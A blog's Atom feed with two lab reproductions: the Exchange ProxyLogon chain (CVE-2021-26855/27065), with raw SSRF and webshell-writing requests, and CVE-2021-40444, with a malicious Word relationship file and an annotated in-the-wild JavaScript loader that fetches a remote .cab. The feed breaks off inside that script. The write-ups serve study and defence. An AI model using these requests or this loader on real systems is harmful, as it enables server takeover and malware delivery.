<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://422926799.github.io/atom.xml" rel="self"/>
  
  <link href="http://422926799.github.io/"/>
  <updated>2021-09-23T09:25:43.912Z</updated>
  <id>http://422926799.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Exchange (CVE-2021-26855和CVE-2021-27065)复现</title>
    <link href="http://422926799.github.io/posts/a0e15799.html"/>
    <id>http://422926799.github.io/posts/a0e15799.html</id>
    <published>2021-09-23T08:39:40.000Z</published>
    <updated>2021-09-23T09:25:43.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code>* DC一台* Exchange一台</code></pre><p>前置介绍:<br>Exchange Server CU18 V15</p><pre><code>* CU18是更新的次数 - (*Exchange更新不以补丁方式更新，直接更新整个框架*)* V15 - Exchange的版本号</code></pre><p>Exchange下载链接:<a href="https://www.microsoft.com/en-us/download/details.aspx?id=102114" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=102114</a><br>注意:</p><pre><code>windows server 2012 - 可安装:Exchange 2013、Exchange 2016 -&gt;安装Exchange还需要多打个补丁推荐2016windows server 2016 - 可安装:Exchange 2016windows server 2019 - 可安装:Exchange 2016、Exchange 2019 -&gt;建议安装2019建议对照OS版本和Exchange版本安装，否则会出现一些奇怪的问题ExchangeExchange Server系统要求:https://docs.microsoft.com/en-us/exchange/plan-and-deploy/system-requirements?preserve-view=true&amp;view=exchserver-2016#supported-operating-systems-for-exchange-2016Exchange共存和兼容方案:https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/system-requirements?view=exchserver-2019-----------------------------------------------------------------------虚拟机内存至少4G虚拟机硬盘大小最小90G，安装Exchange需要80G-----------------------------------------------------------------------1. 以管理员身份运行Windows Powershell，安装必需的 Windows组件：Install-WindowsFeature NET-Framework-45-Features, Server-Media-Foundation, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS2. 安装.NET Framework 4.7.2或更高版本（微软官网）3. 安装Visual C++ Redistributable Package for Visual Studio 2012   https://www.microsoft.com/en-US/download/details.aspx?id=306794. 安装Visual C++ Redistributable Package for Visual Studio 2013   https://www.microsoft.com/en-us/download/details.aspx?id=407845. 安装Microsoft统一通信托管API 4.0 核心运行时（64 位）https://www.microsoft.com/en-US/download/details.aspx?id=349926. Exchange Server加域7. 安装Exchange Server 20168.   DC新建一个用户，用户所在组(Domain Admins/Enterprise Admins/Schema Admins)9.   等待安装（安装过程中不要重启，否则会出现问题，例如:Exchange安装包损坏，域环境出问题，安装到一半无法继续安装）</code></pre><p><a href="https://www.cnblogs.com/shenhaiyu111/p/12221101.html" target="_blank" rel="noopener">https://www.cnblogs.com/shenhaiyu111/p/12221101.html</a> - Exchange Server 2016 本地部署安装流程<br><a href="https://docs.microsoft.com/en-us/exchange/plan-and-deploy/deploy-new-installations/install-mailbox-role?view=exchserver-2019" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/exchange/plan-and-deploy/deploy-new-installations/install-mailbox-role?view=exchserver-2019</a> - 安装过程</p><p>安装时间大概需要30~40分钟（如果准备没问题可直接进行安装，如果出现报错根据给出的问题解决）</p><p>个人安装的环境如下</p><pre><code>Exchange Server |OS:Windows Server 2016|version:CU18、V15DC|domain:YAYI.local|OS:Windows Server 2012</code></pre><p>安装完成访问后如下<br><img src="https://z3.ax1x.com/2021/09/23/4wNvtI.png" alt=""></p><p>安装完后需要配置的：</p><pre><code>1. 允许以&lt;username&gt;@&lt;domain&gt;方式登录2. 配置外部URL访问</code></pre><p>允许以<username>@<domain>方式登录<br><img src="https://z3.ax1x.com/2021/09/23/4wUp1f.png" alt=""></domain></username></p><p>配置外部URL访问<br>（ecp和owa都要改）<br><img src="https://z3.ax1x.com/2021/09/23/4wai26.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4wUn3V.png" alt=""></p><p>新建用户<br>Exchange安装完后只有当前机器加入的域用户，在Exchange新建用户===域新建普通用户<br>添加用户有两种方法：</p><pre><code>* 新建用户* 从现有的域用户添加用户（现有域用户所在的组有什么权限，添加后的用户就有什么权限）</code></pre><p><img src="https://z3.ax1x.com/2021/09/23/4waMGt.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4waQRP.png" alt=""></p><p>邮件发送测试<br><img src="https://z3.ax1x.com/2021/09/23/4wataj.png" alt=""></p><h2 id="CVE-2021–26855-SSRF漏洞复现"><a href="#CVE-2021–26855-SSRF漏洞复现" class="headerlink" title="CVE-2021–26855 - SSRF漏洞复现"></a>CVE-2021–26855 - SSRF漏洞复现</h2><pre><code>POST /ecp/1.ttf HTTP/1.1Host: 100.100.5.137Connection: closeUpgrade-Insecure-Requests: 1DNT: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-Dest: iframeReferer: https://100.100.5.137/ecp/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ug;q=0.8Content-Type: text/xmlCookie: X-BEResource=WIN-KCL6ANQQ2CH.yayi.local/autodiscover/autodiscover.xml?a=#~1;Content-Length: 338&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;    &lt;Request&gt;      &lt;EMailAddress&gt;pentest@yayi.local&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;    &lt;/Request&gt;&lt;/Autodiscover&gt;</code></pre><p>返回对应邮箱用户的信息<br><img src="https://z3.ax1x.com/2021/09/23/4wacdJ.png" alt=""></p><p>漏洞触发过程:<br>OnPostAuthorizeRequest函数,该函数用于对post请求的安全检查,函数中继续调用了该类的OnPostAuthorizeInternal函数<br>OnPostAuthorizeInternal函数中调用SelectHandlerForUnauthenticatedRequest<br><img src="https://z3.ax1x.com/2021/09/23/4wdSOS.png" alt=""></p><p>SelectHandlerForUnauthenticatedRequest函数处理对应的请求路径<br><img src="https://z3.ax1x.com/2021/09/23/4wdAWq.png" alt=""></p><p>最后去到BEResourceRequestHandler.CanHandle(httpContext.Request)<br><img src="https://z3.ax1x.com/2021/09/23/4wdUmD.png" alt=""></p><p>CanHandle如果要返回真,则需要同时让GetBEResouceCookie和IsResourceRequest函数同时返回值为真。跟进这两个函数。<br><img src="https://z3.ax1x.com/2021/09/23/4wwCjK.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwFBD.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwugP.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwlDS.png" alt=""></p><p>经过返回调用去到ResolveAnchorMailbox函数<br><img src="https://z3.ax1x.com/2021/09/23/4wwsUJ.png" alt=""></p><p>获取cookie X-BEResource的值，走到FromString，试用~进行分割<br><img src="https://z3.ax1x.com/2021/09/23/4wwy59.png" alt=""></p><p>在ProxyRequestHandler.BeginProxyRequest函数中调用的的GetTargetBackEndServerUrl函数进行调用<br><img src="https://z3.ax1x.com/2021/09/23/4wwRv6.png" alt=""></p><p>继续看ProxyRequestHandler.BeginProxyRequest后面,ProxyRequestHandler.CreateServerRequest将吧uri发送给后端服务器<br><img src="https://z3.ax1x.com/2021/09/23/4ww4bD.png" alt=""></p><p>跟踪ProxyRequestHandler.CreateServerRequest,函数中PrepareServerRequest将进行uri代理请求的身份认证判断，通过最后一个else绕过认证,达到一个SSRF漏洞攻击的过程<br><img src="https://z3.ax1x.com/2021/09/23/4wwT5d.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwXKf.png" alt=""></p><h2 id="CVE-2021–27065任意文件写入"><a href="#CVE-2021–27065任意文件写入" class="headerlink" title="CVE-2021–27065任意文件写入"></a>CVE-2021–27065任意文件写入</h2><p>编辑OAB配置，在外部链接中写⼊shell并报错<br><img src="https://z3.ax1x.com/2021/09/23/4w0CPs.png" alt=""></p><p>重置虚拟目录处写对应的UNC路径，点击重置<br><img src="https://z3.ax1x.com/2021/09/23/4w0eZF.png" alt=""></p><p>在Exchange Server机器上即可找到写入的shell<br><img src="https://z3.ax1x.com/2021/09/23/4w0NIH.png" alt=""></p><p>现成工具<br>SSRF+绕过登录+任意文件写入===RCE<br><img src="https://z3.ax1x.com/2021/09/23/4w0DQP.png" alt=""></p><p>先通过SSRF获取目标机器的信息<br><img src="https://z3.ax1x.com/2021/09/23/4w0hzq.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4w07eU.png" alt=""></p><p>然后构造请求cookie：X-BEResource=&lt;上一步获取到Exchange Server HostName&gt;/autodiscover/autodiscover.xml?a=~1;<br><img src="https://z3.ax1x.com/2021/09/23/4wBAfA.png" alt=""></p><p>获取legacYDN<br><img src="https://www.mpimg.cn/images/2021/09/23/Image.png" alt=""></p><p>然后请求得到SID<br><img src="https://www.mpimg.cn/images/2021/09/23/Imagec39d926bdc3e3d63.png" alt=""></p><p>构造JSON请求获取登录cookie<br><img src="https://www.mpimg.cn/image/V33n" alt=""></p><p>请求获取ECP的RawIdentity<br><img src="https://www.mpimg.cn/image/VV9r" alt=""></p><p>shell写入<br><img src="https://www.mpimg.cn/image/VW7Z" alt=""></p><p>路径写入并重置</p><pre><code>POST /ecp/iikj.js HTTP/1.1Host: 192.168.93.135User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: X-BEResource=Administrator@WIN-KCL6ANQQ2CH.YAYI.local:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=MbAJ26WCAk6Yisdw_SmpymgBqW31f9kIoxPEixgESnzNd6nbtbC0_wBn68G5lmxxKrl586QkRNA.&amp;a=~1942062522; ASP.NET_SessionId=7e41e4fe-6c9c-4830-a3df-ed346a6ba284; msExchEcpCanary=MbAJ26WCAk6Yisdw_SmpymgBqW31f9kIoxPEixgESnzNd6nbtbC0_wBn68G5lmxxKrl586QkRNA.msExchLogonMailbox: S-1-5-20Content-Type: application/json; charset=utf-8Content-Length: 393{&quot;identity&quot;: {&quot;__type&quot;: &quot;Identity:ECP&quot;, &quot;DisplayName&quot;: &quot;OAB (Default Web Site)&quot;, &quot;RawIdentity&quot;: &quot;977787fb-ece0-454e-9363-2cd8579ca39e&quot;}, &quot;properties&quot;: {&quot;Parameters&quot;: {&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;FilePathName&quot;: &quot;\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\c1gfR60IjXo3CBSLuwtW.aspx&quot;}}}</code></pre><p><img src="https://www.mpimg.cn/image/Vnx3" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/-zhong/p/14533053.html" target="_blank" rel="noopener">https://www.cnblogs.com/-zhong/p/14533053.html</a><br><a href="https://forum.butian.net/share/539" target="_blank" rel="noopener">https://forum.butian.net/share/539</a><br><a href="https://www.cnblogs.com/shenhaiyu111/p/12221101.html" target="_blank" rel="noopener">https://www.cnblogs.com/shenhaiyu111/p/12221101.html</a><br><a href="https://jishuin.proginn.com/p/763bfbd5ac72" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd5ac72</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;* DC一台
* Exchange一台
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;前置介绍:&lt;br&gt;Exchange </summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-40444漏洞复现</title>
    <link href="http://422926799.github.io/posts/3e27999a.html"/>
    <id>http://422926799.github.io/posts/3e27999a.html</id>
    <published>2021-09-13T08:25:37.000Z</published>
    <updated>2021-09-13T08:48:34.866Z</updated>
    
    <content type="html"><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>office 2016<br>windows 10 ver:1909</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>和十年前的IE网马一样，IE自动安装新的插件导致该漏洞，以及office可以引用mshtml格式，导致排版引擎模板可执行</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>（安了office 2016才有的CLSID，office 2010并没有）<br>这个漏洞是利用ie的COM口实现的。CLSID:edbc374c-5730-432a-b5b8-de94f0b57217<br><img src="https://z3.ax1x.com/2021/09/13/4PcrSH.png" alt=""></p><p>安了office 2010的win7<br><img src="https://z3.ax1x.com/2021/09/13/4Pcgmt.png" alt=""></p><p>原样本地址：<a href="https://app.any.run/tasks/36c14029-9df8-439c-bba0-45f2643b0c70/#" target="_blank" rel="noopener">https://app.any.run/tasks/36c14029-9df8-439c-bba0-45f2643b0c70/#</a><br>修改word/_rels/document.xml，将hdusi.com改为自己的IP</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId8&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme&quot; Target=&quot;theme/theme1.xml&quot;/&gt;&lt;Relationship Id=&quot;rId3&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings&quot; Target=&quot;webSettings.xml&quot;/&gt;&lt;Relationship Id=&quot;rId7&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable&quot; Target=&quot;fontTable.xml&quot;/&gt;&lt;Relationship Id=&quot;rId2&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings&quot; Target=&quot;settings.xml&quot;/&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles&quot; Target=&quot;styles.xml&quot;/&gt;&lt;Relationship Id=&quot;rId6&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject&quot; Target=&quot;mhtml:http://3079-183-6-55-142.ngrok.io/word.html!x-usc:http://3079-183-6-55-142.ngrok.io/word.html&quot; TargetMode=&quot;External&quot;/&gt;&lt;Relationship Id=&quot;rId5&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot; Target=&quot;media/image2.wmf&quot;/&gt;&lt;Relationship Id=&quot;rId4&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot; Target=&quot;media/image1.jpeg&quot;/&gt;&lt;/Relationships&gt;</code></pre><p>或者直接用已经公开的exp生成：<a href="https://github.com/lockedbyte/CVE-2021-40444" target="_blank" rel="noopener">https://github.com/lockedbyte/CVE-2021-40444</a><br>效果如下<br><img src="https://z3.ax1x.com/2021/09/13/4PcL7V.jpg" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PgS1J.jpg" alt=""></p><p>触发漏洞主要是word.html里的js和原版混淆的一样，只是改了远程请求链接</p><pre><code class="javascrript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;Expires&quot; content=&quot;-1&quot;&gt;        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=11&quot;&gt;    &lt;/head&gt;    &lt;body&gt;&lt;!-- 这段js利用[]进行函数执行     --&gt;&lt;!-- 重复的垃圾代码 --&gt;        &lt;script&gt;            var a0_0x127f = [&#39;123&#39;, &#39;365952KMsRQT&#39;, &#39;tiveX&#39;, &#39;/Lo&#39;, &#39;./../../&#39;, &#39;contentDocument&#39;, &#39;ppD&#39;, &#39;Dat&#39;, &#39;close&#39;, &#39;Acti&#39;, &#39;removeChild&#39;, &#39;mlF&#39;, &#39;write&#39;, &#39;./A&#39;, &#39;ata/&#39;, &#39;ile&#39;, &#39;../&#39;, &#39;body&#39;, &#39;setAttribute&#39;, &#39;#version=5,0,0,0&#39;, &#39;ssi&#39;, &#39;iframe&#39;, &#39;748708rfmUTk&#39;, &#39;documentElement&#39;, &#39;lFile&#39;, &#39;location&#39;, &#39;159708hBVRtu&#39;, &#39;a/Lo&#39;, &#39;Script&#39;, &#39;document&#39;, &#39;call&#39;, &#39;contentWindow&#39;, &#39;emp&#39;, &#39;Document&#39;, &#39;Obj&#39;, &#39;prototype&#39;, &#39;lfi&#39;, &#39;bject&#39;, &#39;send&#39;, &#39;appendChild&#39;, &#39;Low/championship.inf&#39;, &#39;htmlfile&#39;, &#39;115924pLbIpw&#39;, &#39;GET&#39;, &#39;p/championship.inf&#39;, &#39;1109sMoXXX&#39;, &#39;./../A&#39;, &#39;htm&#39;, &#39;l/T&#39;, &#39;cal/&#39;, &#39;1wzQpCO&#39;, &#39;ect&#39;, &#39;w/championship.inf&#39;, &#39;522415dmiRUA&#39;, &#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab&#39;, &#39;88320wWglcB&#39;, &#39;XMLHttpRequest&#39;, &#39;championship.inf&#39;, &#39;Act&#39;, &#39;D:edbc374c-5730-432a-b5b8-de94f0b57217&#39;, &#39;open&#39;, &#39;&lt;bo&#39;, &#39;HTMLElement&#39;, &#39;/..&#39;, &#39;veXO&#39;, &#39;102FePAWC&#39;];            function a0_0x15ec(_0x329dba, _0x46107c) {                return a0_0x15ec = function(_0x127f75, _0x15ecd5) {                    _0x127f75 = _0x127f75 - 0xaa;                    var _0x5a770c = a0_0x127f[_0x127f75];                    return _0x5a770c;                }                ,                a0_0x15ec(_0x329dba, _0x46107c); //a0_0x15ec函数主要调用返回            }            (function(_0x59985d, _0x17bed8) { //_0x59985d -&gt; a0_0x127f                var _0x1eac90 = a0_0x15ec;                while (!![]) {                    try {                        var _0x2f7e2d = parseInt(_0x1eac90(0xce)) + parseInt(_0x1eac90(0xd8)) * parseInt(_0x1eac90(0xc4)) + parseInt(_0x1eac90(0xc9)) * -parseInt(_0x1eac90(0xad)) + parseInt(_0x1eac90(0xb1)) + parseInt(_0x1eac90(0xcc)) + -parseInt(_0x1eac90(0xc1)) + parseInt(_0x1eac90(0xda));                        if (_0x2f7e2d === _0x17bed8) //判断两者数值是否等于384881，如果相等则break                            break;                        else                            _0x59985d[&#39;push&#39;](_0x59985d[&#39;shift&#39;]()); //将a0_0x127f数组首位元素移动到数组尾部                    } catch (_0x34af1e) {                        _0x59985d[&#39;push&#39;](_0x59985d[&#39;shift&#39;]());                    }                }            }(a0_0x127f, 0x5df71), //数组元素移动到尾部的算法            function() {                var _0x2ee207 = a0_0x15ec                  , _0x279eab = window                  , _0x1b93d7 = _0x279eab[_0x2ee207(0xb4)] //调用的a0_0x15ec函数 -&gt; window.document                  , _0xcf5a2 = _0x279eab[_0x2ee207(0xb8)][&#39;prototype&#39;][&#39;createElement&#39;] // -&gt; Document.prototype.createElement                  , _0x4d7c02 = _0x279eab[_0x2ee207(0xb8)][&#39;prototype&#39;][_0x2ee207(0xe5)] // -&gt; Document.prototype.write                  , _0x1ee31c = _0x279eab[_0x2ee207(0xd5)][_0x2ee207(0xba)][_0x2ee207(0xbe)] // -&gt; HTMLElement.prototype.appendChild                  , _0x2d20cd = _0x279eab[_0x2ee207(0xd5)][_0x2ee207(0xba)][_0x2ee207(0xe3)] // -&gt; HTMLElement.prototype.removeChild                  , _0x4ff114 = _0xcf5a2[&#39;call&#39;](_0x1b93d7, _0x2ee207(0xac)); // -&gt; Document.prototype.createElement.call(window.document,&quot;iframe&quot;) -&gt; &lt;new iframe&gt;                try {                    _0x1ee31c[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xea)], _0x4ff114); // -&gt; HTMLElement.prototype.appendChild.call(window.document.body,&lt;new iframe&gt;) //添加iframe标签                } catch (_0x1ab454) {                    _0x1ee31c[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xae)], _0x4ff114);                }                var _0x403e5f = _0x4ff114[_0x2ee207(0xb6)][&#39;ActiveXObject&#39;] // -&gt; &lt;new iframe&gt;.contentWindow.ActiveXObject                  , _0x224f7d = new _0x403e5f(_0x2ee207(0xc6) + _0x2ee207(0xbb) + &#39;le&#39;); // -&gt; new _0x403e5f(&#39;htmlfile&#39;) -&gt; new ActiveXObject(&#39;htmlfijle&#39;)                _0x4ff114[_0x2ee207(0xde)][&#39;open&#39;]()[_0x2ee207(0xe1)](); // -&gt; &lt;new iframe&gt;.contentDocument.open().close()                var _0x371a71 = &#39;p&#39;;                try {                    _0x2d20cd[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xea)], _0x4ff114); // -&gt; HTMLElement.prototype.removeChild.call(window.document.body,&lt;new iframe&gt;)                } catch (_0x3b004e) {                    _0x2d20cd[&#39;call&#39;](_0x1b93d7[&#39;documentElement&#39;], _0x4ff114);                }                function _0x2511dc() {                    var _0x45ae57 = _0x2ee207;                    return _0x45ae57(0xcd);                }                _0x224f7d[&#39;open&#39;]()[_0x2ee207(0xe1)](); // -&gt; _0x224f7d.open().close()  -&gt; new ActiveXObject(&#39;htmlfijle&#39;).open().close()                var _0x3e172f = new _0x224f7d[(_0x2ee207(0xb3))][(_0x2ee207(0xd1)) + &#39;iveX&#39; + (_0x2ee207(0xb9)) + (_0x2ee207(0xca))](&#39;htm&#39; + _0x2ee207(0xaf)); // -&gt; new _0x224f7d.Script.ActiveXObject(&#39;htmlFile&#39;) -&gt; new ActiveXObject(&#39;htmlfijle&#39;).Script.ActiveXObject(&#39;htmlFile&#39;)                _0x3e172f[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; _0x3e172f.open().close()                var _0xd7e33d = &#39;c&#39;                  , _0x35b0d4 = new _0x3e172f[(_0x2ee207(0xb3))][&#39;Ac&#39; + (_0x2ee207(0xdb)) + &#39;Ob&#39; + &#39;ject&#39;](&#39;ht&#39; + _0x2ee207(0xe4) + _0x2ee207(0xe8)); // -&gt; new _0x3e172f.Script.ActiveXObject(&#39;htmlFile&#39;)                _0x35b0d4[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; _0x35b0d4.open().close()                var _0xf70c6e = new _0x35b0d4[&#39;Script&#39;][(_0x2ee207(0xe2)) + (_0x2ee207(0xd7)) + (_0x2ee207(0xbc))](&#39;ht&#39; + &#39;mlF&#39; + _0x2ee207(0xe8));                _0xf70c6e[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; new _0x35b0d4.Script.ActiveXObject(&#39;htmlFile&#39;)                var _0xfed1ef = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x5f3191 = new ActiveXObject(_0x2ee207(0xc0)) // new ActiveXObject(&#39;htmlFile&#39;)                  , _0xafc795 = new ActiveXObject(_0x2ee207(0xc0))                  , _0x5a6d4b = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x258443 = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x53c2ab = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x3a627b = _0x279eab[_0x2ee207(0xcf)] //window.XMLHttpRequest                  , _0x2c84a8 = new _0x3a627b() // new window.XMLHttpRequest()                  , _0x220eee = _0x3a627b[_0x2ee207(0xba)][_0x2ee207(0xd3)] //&lt;XMLHttpRequest&gt;.prototype.open                  , _0x3637d8 = _0x3a627b[_0x2ee207(0xba)][_0x2ee207(0xbd)] //&lt;XMLHttpRequest&gt;.prototype.send                  , _0x27de6f = _0x279eab[&#39;setTimeout&#39;]; //window.XMLHttpRequest.setTimeout                _0x220eee[_0x2ee207(0xb5)](_0x2c84a8, _0x2ee207(0xc2), _0x2511dc(), ![]), //&lt;XMLHttpRequest&gt;.prototype.open.call(&lt;XMLHttpRequest&gt;,&#39;GET&#39;,&#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab&#39;,![])                _0x3637d8[_0x2ee207(0xb5)](_0x2c84a8),//&lt;XMLHttpRequest&gt;.prototype.send.call(&lt;XMLHttpRequest&gt;,)                _0xf70c6e[_0x2ee207(0xb3)][_0x2ee207(0xb4)][_0x2ee207(0xe5)](_0x2ee207(0xd4) + &#39;dy&gt;&#39;); //_0xf70c6e.Script.document.write(&#39;&lt;body&gt;&#39;)                var _0x126e83 = _0xcf5a2[_0x2ee207(0xb5)](_0xf70c6e[&#39;Script&#39;][_0x2ee207(0xb4)], &#39;ob&#39; + &#39;je&#39; + &#39;ct&#39;); //Document.prototype.createElement.call(_0xf70c6e.Script.document,&#39;object&#39;)                _0x126e83[_0x2ee207(0xeb)](&#39;co&#39; + &#39;de&#39; + &#39;ba&#39; + &#39;se&#39;, _0x2511dc() + _0x2ee207(0xaa)); //_0x126e83.setAttribute(codebase,&#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab#version=5,0,0,0&#39;)                var _0x487bfa = &#39;l&#39;;                _0x126e83[_0x2ee207(0xeb)](&#39;c&#39; + &#39;la&#39; + _0x2ee207(0xab) + &#39;d&#39;, &#39;CL&#39; + &#39;SI&#39; + _0x2ee207(0xd2)), //_0x126e83.setAttribute(&#39;CLSID:edbc374c-5730-432a-b5b8-de94f0b57217&#39;)                _0x1ee31c[_0x2ee207(0xb5)](_0xf70c6e[_0x2ee207(0xb3)][&#39;document&#39;][&#39;body&#39;], _0x126e83), //HTMLElement.prototype.appendChild.call(_0xf70c6e.Script.document.body,_0x126e83)                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                &lt;!-- 重复垃圾代码分割线 --&gt;                //_0xfed1ef.Script.location=&#39;.cpl:123&#39;                _0xfed1ef[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[&#39;Script&#39;][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                &lt;!-- 重复垃圾代码分割线 --&gt;                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xc5) + _0x2ee207(0xdf) + _0x2ee207(0xe7) + &#39;Lo&#39; + _0x2ee207(0xc8) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + _0x2ee207(0xcb)                &lt;!-- 重复垃圾代码分割线2 --&gt;                //_0xfed1ef.Script.location==&#39;.cpl:../../../AppData/Local/Temp/Low/championship.inf&#39;,                _0x5f3191[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xe6) + &#39;pp&#39; + 